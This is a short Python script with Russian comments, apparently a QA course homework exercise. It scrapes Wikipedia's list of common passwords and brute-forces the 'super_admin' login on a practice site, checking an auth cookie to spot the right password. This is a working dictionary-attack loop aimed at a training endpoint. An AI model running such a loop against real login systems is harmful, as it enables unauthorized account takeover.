import requests
import lxml
from bs4 import BeautifulSoup

# Логин нашего коллеги
login = "super_admin"

# Парсим таблицу паролей со страницы Википедии
all_passwords = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
soup = BeautifulSoup(all_passwords.text, 'lxml')
final_table = soup.select_one("table:nth-of-type(2)")
filteredList = []
for td in final_table.find_all('td', align='left'):
    td_value = td.get_text()
    td_value_perform = td_value.strip()
    filteredList.append(td_value_perform)

# Удаляем дубликаты паролей
final_passwords = set(filteredList)

# Выводим пароли без дубликатов
print(final_passwords)

# Выводим сколько всего было паролей
print(len(filteredList), "- всего паролей")

# Выводим сколько паролей без дубликатов. Это нужно, чтобы сделать меньшее количество запросов и уменшить время
# выполнения программы
print(len(final_passwords), "- уникальных паролей")

for password in final_passwords:
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                              data={"login": login, "password": password})
    cookies = response1.cookies
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response2.text == "You are NOT authorized":
        continue
    else:
        print(f"{response2.text}, верный пароль -- {password}")
